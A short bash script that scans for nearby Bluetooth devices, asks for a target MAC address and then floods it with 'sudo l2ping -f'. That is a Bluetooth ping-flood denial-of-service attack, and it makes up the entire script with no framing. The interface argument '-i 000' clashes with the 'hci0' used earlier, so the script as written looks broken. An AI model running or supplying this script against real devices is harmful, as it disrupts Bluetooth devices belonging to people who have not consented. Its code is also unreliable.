#!/bin/bash
set -e
error_exit() {
    echo "Error: Command failed. Exiting script."
    exit 1
}
trap error_exit ERR
sudo hciconfig
sudo hciconfig hci0 up
sudo hciconfig hci0 piscan
echo "Scanning for Bluetooth devices..."
sudo hcitool scan
read -p "Press Enter after the scan is complete..."
read -p "Enter the MAC address of the device you want to target: " TARGET_MAC
sudo l2ping -i 000 -f $TARGET_MAC
